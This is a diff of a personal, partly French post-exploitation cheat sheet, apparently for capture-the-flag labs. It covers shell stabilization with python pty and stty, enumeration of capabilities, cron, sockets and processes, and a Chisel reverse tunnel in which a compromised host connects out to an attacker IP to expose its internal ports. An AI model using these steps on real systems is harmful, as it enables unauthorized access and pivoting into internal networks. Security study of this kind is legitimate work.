@@ -1,6 +1,5 @@
 ## *update shell*
 ```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
 script /dev/null -c bash
 ^Z
 stty raw -echo; fg
@@ -13,8 +12,7 @@ python -c 'import pty;pty.spawn("/bin/bash");'
 ctrl z  
 echo $TERM  
 stty -a  
-stty raw -echo  
-fg  
+stty raw -echo; fg  
 
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
 export TERM=xterm256-color  
@@ -65,7 +63,14 @@ getcap -r / 2>/dev/null
 ## *con.d*
 ```
 ls -la /etc/cron.d
-
+```
+## _ss_
+```
+ss -tunl
+```
+## _process_
+```
+ps auxww
 ```
 ## _search ps log_
 ```
@@ -75,4 +80,16 @@ ls -la /etc/cron.d
 redirect the request to my machine
 ```
 export http_proxy=http://adresse_du_proxy:port_du_proxy
+```
+### Partage des ports de la cible sur ma machine
+On utilise *Chisel* https://github.com/jpillora/chisel/releases/tag/v1.9.1
+### creation du serveur proxi sur ma machine
+└─# 
+```
+./chisel server -p 8000 --reverse
+```
+
+www-data@only4you:/tmp$
+```
+./chisel client 10.10.17.161:8000 R:127.0.0.1:3000 R:127.0.0.1:8001
 ```
